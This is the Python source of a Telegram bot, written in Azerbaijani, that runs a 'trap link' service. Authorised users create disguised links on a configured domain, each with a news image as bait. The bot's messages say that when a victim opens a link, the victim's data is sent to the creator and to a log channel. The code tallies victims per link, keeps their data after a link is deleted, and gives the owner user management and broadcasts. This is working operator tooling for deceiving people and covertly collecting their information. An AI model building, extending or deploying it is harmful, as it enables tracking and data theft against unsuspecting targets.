import asyncio
import logging
import json
import os
from datetime import datetime
from typing import Optional

from telegram import Update, InlineKeyboardButton, InlineKeyboardMarkup
from telegram.ext import Application, CommandHandler, MessageHandler, filters, ContextTypes, CallbackQueryHandler
from sqlalchemy.orm import Session

from config import Config
from database import get_db, AccessList, TrapURL, VictimData, UserStep, create_tables
from utils import send_to_log_channel, send_to_creator, get_ip_info, is_user_authorized

# Setup logging
logging.basicConfig(
    format='%(asctime)s - %(name)s - %(levelname)s - %(message)s',
    level=logging.INFO
)
logger = logging.getLogger(__name__)

config = Config.from_env()

class TelegramBot:
    def __init__(self):
        self.application = Application.builder().token(config.BOT_TOKEN).build()
        self.setup_handlers()

    def setup_handlers(self):
        # Command handlers
        self.application.add_handler(CommandHandler("start", self.start_command))
        self.application.add_handler(CommandHandler("newurl", self.newurl_command))
        self.application.add_handler(CommandHandler("delurl", self.delurl_command))
        self.application.add_handler(CommandHandler("myurls", self.myurls_command))
        
        # Owner commands
        self.application.add_handler(CommandHandler("master_stats", self.master_stats))
        self.application.add_handler(CommandHandler("master_users", self.master_users))
        self.application.add_handler(CommandHandler("master_ban", self.master_ban))
        self.application.add_handler(CommandHandler("master_unban", self.master_unban))
        self.application.add_handler(CommandHandler("master_broadcast", self.master_broadcast))
        self.application.add_handler(CommandHandler("master_cleanup", self.master_cleanup))
        self.application.add_handler(CommandHandler("master_export", self.master_export))
        self.application.add_handler(CommandHandler("accesid", self.grant_access))
        self.application.add_handler(CommandHandler("unacces", self.remove_access))
        self.application.add_handler(CommandHandler("acceslist", self.access_list))
        
        # Message handlers
        self.application.add_handler(MessageHandler(filters.PHOTO, self.handle_photo))
        self.application.add_handler(MessageHandler(filters.TEXT & ~filters.COMMAND, self.handle_text))
        
        # Callback handlers
        self.application.add_handler(CallbackQueryHandler(self.handle_callback))

    async def start_command(self, update: Update, context: ContextTypes.DEFAULT_TYPE):
        user = update.effective_user
        
        if not await is_user_authorized(user.id):
            await update.message.reply_text("❌ Bu botu istifadə etmək üçün icazəniz yoxdur.")
            return
        
        welcome_text = f"""
🔥 **Xoş gəlmisiniz, {user.first_name}!**

📋 **Əsas əmrlər:**
• `/newurl [ad]` - Yeni tələ linki yaradın
• `/delurl [ad]` - Tələ linkini silin  
• `/myurls` - Yaratdığınız linkləri görün

👑 **Owner əmrləri:**
• `/master_stats` - Sistem statistikası
• `/master_users` - İstifadəçi siyahısı
• `/master_ban` - İstifadəçini qadağan et
• `/master_unban` - Qadağanı qaldır
• `/master_broadcast` - Toplu mesaj göndər

🎯 **Necə istifadə etmək olar:**
1. `/newurl xeber1` yazın
2. Xəbər şəklini göndərin
3. Link hazır olacaq!
        """
        
        await update.message.reply_text(welcome_text, parse_mode='Markdown')

    async def newurl_command(self, update: Update, context: ContextTypes.DEFAULT_TYPE):
        user = update.effective_user
        
        if not await is_user_authorized(user.id):
            await update.message.reply_text("❌ Bu botu istifadə etmək üçün icazəniz yoxdur.")
            return
        
        if not context.args:
            await update.message.reply_text("❌ Link adını daxil edin!\nMisal: `/newurl xeber1`", parse_mode='Markdown')
            return
        
        url_name = context.args[0].lower()
        
        # Check if URL name already exists
        db = next(get_db())
        existing_url = db.query(TrapURL).filter(TrapURL.name == url_name).first()
        if existing_url:
            await update.message.reply_text(f"❌ `{url_name}` adlı link artıq mövcuddur!", parse_mode='Markdown')
            db.close()
            return
        
        # Save user step
        user_step = UserStep(
            user_id=user.id,
            step="waiting_for_photo",
            data=json.dumps({"url_name": url_name})
        )
        db.add(user_step)
        db.commit()
        db.close()
        
        await update.message.reply_text(
            f"📸 `{url_name}` linki üçün xəbər şəklini göndərin:",
            parse_mode='Markdown'
        )

    async def handle_photo(self, update: Update, context: ContextTypes.DEFAULT_TYPE):
        user = update.effective_user
        
        if not await is_user_authorized(user.id):
            return
        
        db = next(get_db())
        user_step = db.query(UserStep).filter(
            UserStep.user_id == user.id,
            UserStep.step == "waiting_for_photo"
        ).first()
        
        if not user_step:
            await update.message.reply_text("❌ Əvvəlcə `/newurl [ad]` əmrini istifadə edin.", parse_mode='Markdown')
            db.close()
            return
        
        step_data = json.loads(user_step.data)
        url_name = step_data["url_name"]
        
        # Download photo
        photo = update.message.photo[-1]
        photo_file = await photo.get_file()
        
        # Create uploads directory if it doesn't exist
        os.makedirs("uploads", exist_ok=True)
        photo_path = f"uploads/{url_name}_{datetime.now().strftime('%Y%m%d_%H%M%S')}.jpg"
        await photo_file.download_to_drive(photo_path)
        
        # Create trap URL
        trap_url = TrapURL(
            name=url_name,
            creator_id=user.id,
            creator_username=user.username,
            image_path=photo_path
        )
        db.add(trap_url)
        
        # Remove user step
        db.delete(user_step)
        db.commit()
        
        # Generate trap URL
        trap_link = f"https://{config.DOMAIN}/{url_name}"
        
        success_message = f"""
✅ **Tələ linki hazırdır!**

🔗 **Link:** `{trap_link}`
📝 **Ad:** `{url_name}`
📸 **Şəkil:** Yükləndi
📅 **Tarix:** {datetime.now().strftime('%d.%m.%Y %H:%M')}

⚠️ **Diqqət:** Bu link açıldıqda qurbanın məlumatları həm sizə, həm də log kanalına göndəriləcək.
        """
        
        await update.message.reply_text(success_message, parse_mode='Markdown')
        
        # Send to log channel
        await send_to_log_channel(
            f"🆕 **Yeni tələ linki yaradıldı**\n\n"
            f"👤 **Yaradan:** {user.first_name} (@{user.username})\n"
            f"🔗 **Link:** {trap_link}\n"
            f"📝 **Ad:** {url_name}"
        )
        
        db.close()

    async def delurl_command(self, update: Update, context: ContextTypes.DEFAULT_TYPE):
        user = update.effective_user
        
        if not await is_user_authorized(user.id):
            await update.message.reply_text("❌ Bu botu istifadə etmək üçün icazəniz yoxdur.")
            return
        
        if not context.args:
            await update.message.reply_text("❌ Silinəcək link adını daxil edin!\nMisal: `/delurl xeber1`", parse_mode='Markdown')
            return
        
        url_name = context.args[0].lower()
        
        db = next(get_db())
        trap_url = db.query(TrapURL).filter(
            TrapURL.name == url_name,
            TrapURL.creator_id == user.id
        ).first()
        
        if not trap_url:
            await update.message.reply_text(f"❌ `{url_name}` adlı link tapılmadı və ya sizə aid deyil!", parse_mode='Markdown')
            db.close()
            return
        
        # Delete associated image file
        if trap_url.image_path and os.path.exists(trap_url.image_path):
            os.remove(trap_url.image_path)
        
        # Mark as inactive instead of deleting (to preserve victim data)
        trap_url.is_active = False
        db.commit()
        
        await update.message.reply_text(f"✅ `{url_name}` linki silindi!", parse_mode='Markdown')
        
        # Send to log channel
        await send_to_log_channel(
            f"🗑️ **Tələ linki silindi**\n\n"
            f"👤 **Silən:** {user.first_name} (@{user.username})\n"
            f"📝 **Link adı:** {url_name}"
        )
        
        db.close()

    async def myurls_command(self, update: Update, context: ContextTypes.DEFAULT_TYPE):
        user = update.effective_user
        
        if not await is_user_authorized(user.id):
            await update.message.reply_text("❌ Bu botu istifadə etmək üçün icazəniz yoxdur.")
            return
        
        db = next(get_db())
        user_urls = db.query(TrapURL).filter(
            TrapURL.creator_id == user.id,
            TrapURL.is_active == True
        ).all()
        
        if not user_urls:
            await update.message.reply_text("📭 Hələ heç bir link yaratmamısınız.")
            db.close()
            return
        
        message = "📋 **Sizin tələ linkləriniz:**\n\n"
        
        for url in user_urls:
            capture_count = db.query(VictimData).filter(VictimData.trap_url_id == url.id).count()
            trap_link = f"https://{config.DOMAIN}/{url.name}"
            
            message += f"🔗 **{url.name}**\n"
            message += f"   • Link: `{trap_link}`\n"
            message += f"   • Qurban sayı: {capture_count}\n"
            message += f"   • Yaradılma: {url.created_at.strftime('%d.%m.%Y %H:%M')}\n\n"
        
        await update.message.reply_text(message, parse_mode='Markdown')
        db.close()

    # Owner commands
    async def master_stats(self, update: Update, context: ContextTypes.DEFAULT_TYPE):
        if update.effective_user.id != config.OWNER_ID:
            await update.message.reply_text("❌ Bu əmri yalnız owner istifadə edə bilər.")
            return
        
        db = next(get_db())
        
        total_urls = db.query(TrapURL).filter(TrapURL.is_active == True).count()
        total_victims = db.query(VictimData).count()
        total_users = db.query(AccessList).count()
        
        stats_message = f"""
📊 **Sistem Statistikası**

🔗 **Aktiv linklər:** {total_urls}
🎯 **Ümumi qurbanlar:** {total_victims}
👥 **İcazəli istifadəçilər:** {total_users}
📅 **Tarix:** {datetime.now().strftime('%d.%m.%Y %H:%M')}
        """
        
        await update.message.reply_text(stats_message, parse_mode='Markdown')
        db.close()

    async def grant_access(self, update: Update, context: ContextTypes.DEFAULT_TYPE):
        if update.effective_user.id != config.OWNER_ID:
            await update.message.reply_text("❌ Bu əmri yalnız owner istifadə edə bilər.")
            return
        
        if not context.args:
            await update.message.reply_text("❌ İstifadəçi ID-sini daxil edin!\nMisal: `/accesid 123456789`", parse_mode='Markdown')
            return
        
        try:
            user_id = int(context.args[0])
        except ValueError:
            await update.message.reply_text("❌ Düzgün istifadəçi ID daxil edin!")
            return
        
        db = next(get_db())
        existing_access = db.query(AccessList).filter(AccessList.user_id == user_id).first()
        
        if existing_access:
            await update.message.reply_text(f"❌ İstifadəçi {user_id} artıq icazə siyahısındadır!")
            db.close()
            return
        
        access_entry = AccessList(
            user_id=user_id,
            granted_by=config.OWNER_ID
        )
        db.add(access_entry)
        db.commit()
        
        await update.message.reply_text(f"✅ İstifadəçi {user_id} icazə siyahısına əlavə edildi!")
        db.close()

    async def remove_access(self, update: Update, context: ContextTypes.DEFAULT_TYPE):
        if update.effective_user.id != config.OWNER_ID:
            await update.message.reply_text("❌ Bu əmri yalnız owner istifadə edə bilər.")
            return
        
        if not context.args:
            await update.message.reply_text("❌ İstifadəçi ID-sini daxil edin!\nMisal: `/unacces 123456789`", parse_mode='Markdown')
            return
        
        try:
            user_id = int(context.args[0])
        except ValueError:
            await update.message.reply_text("❌ Düzgün istifadəçi ID daxil edin!")
            return
        
        db = next(get_db())
        access_entry = db.query(AccessList).filter(AccessList.user_id == user_id).first()
        
        if not access_entry:
            await update.message.reply_text(f"❌ İstifadəçi {user_id} icazə siyahısında deyil!")
            db.close()
            return
        
        db.delete(access_entry)
        db.commit()
        
        await update.message.reply_text(f"✅ İstifadəçi {user_id} icazə siyahısından çıxarıldı!")
        db.close()

    async def access_list(self, update: Update, context: ContextTypes.DEFAULT_TYPE):
        if update.effective_user.id != config.OWNER_ID:
            await update.message.reply_text("❌ Bu əmri yalnız owner istifadə edə bilər.")
            return
        
        db = next(get_db())
        access_users = db.query(AccessList).all()
        
        if not access_users:
            await update.message.reply_text("📭 İcazə siyahısı boşdur.")
            db.close()
            return
        
        message = "👥 **İcazəli İstifadəçilər:**\n\n"
        
        for user in access_users:
            message += f"🆔 **{user.user_id}**\n"
            if user.username:
                message += f"   • Username: @{user.username}\n"
            message += f"   • İcazə tarixi: {user.granted_at.strftime('%d.%m.%Y %H:%M')}\n\n"
        
        await update.message.reply_text(message, parse_mode='Markdown')
        db.close()

    async def handle_text(self, update: Update, context: ContextTypes.DEFAULT_TYPE):
        # Handle any text messages that aren't commands
        pass

    async def handle_callback(self, update: Update, context: ContextTypes.DEFAULT_TYPE):
        # Handle inline keyboard callbacks
        pass

    # Additional owner commands (simplified for now)
    async def master_users(self, update: Update, context: ContextTypes.DEFAULT_TYPE):
        if update.effective_user.id != config.OWNER_ID:
            return
        await self.access_list(update, context)

    async def master_ban(self, update: Update, context: ContextTypes.DEFAULT_TYPE):
        if update.effective_user.id != config.OWNER_ID:
            return
        await self.remove_access(update, context)

    async def master_unban(self, update: Update, context: ContextTypes.DEFAULT_TYPE):
        if update.effective_user.id != config.OWNER_ID:
            return
        await self.grant_access(update, context)

    async def master_broadcast(self, update: Update, context: ContextTypes.DEFAULT_TYPE):
        if update.effective_user.id != config.OWNER_ID:
            await update.message.reply_text("❌ Bu əmri yalnız owner istifadə edə bilər.")
            return
        
        if not context.args:
            await update.message.reply_text("❌ Broadcast mesajını daxil edin!")
            return
        
        message = " ".join(context.args)
        
        db = next(get_db())
        users = db.query(AccessList).all()
        
        sent_count = 0
        for user in users:
            try:
                await context.bot.send_message(user.user_id, f"📢 **Broadcast:**\n\n{message}", parse_mode='Markdown')
                sent_count += 1
            except:
                pass
        
        await update.message.reply_text(f"✅ Mesaj {sent_count} istifadəçiyə göndərildi!")
        db.close()

    async def master_cleanup(self, update: Update, context: ContextTypes.DEFAULT_TYPE):
        if update.effective_user.id != config.OWNER_ID:
            await update.message.reply_text("❌ Bu əmri yalnız owner istifadə edə bilər.")
            return
        
        db = next(get_db())
        
        # Clean old user steps (older than 24 hours)
        from datetime import timedelta
        cutoff_time = datetime.utcnow() - timedelta(hours=24)
        old_steps = db.query(UserStep).filter(UserStep.created_at < cutoff_time).all()
        
        for step in old_steps:
            db.delete(step)
        
        db.commit()
        
        await update.message.reply_text(f"✅ {len(old_steps)} köhnə addım təmizləndi!")
        db.close()

    async def master_export(self, update: Update, context: ContextTypes.DEFAULT_TYPE):
        if update.effective_user.id != config.OWNER_ID:
            await update.message.reply_text("❌ Bu əmri yalnız owner istifadə edə bilər.")
            return
        
        # This would export victim data - implementation depends on requirements
        await update.message.reply_text("📊 Export funksiyası tezliklə əlavə ediləcək!")

    async def run(self):
        """Start the bot"""
        create_tables()
        await self.application.initialize()
        await self.application.start()
        await self.application.updater.start_polling()

if __name__ == "__main__":
    bot = TelegramBot()
    asyncio.run(bot.run())
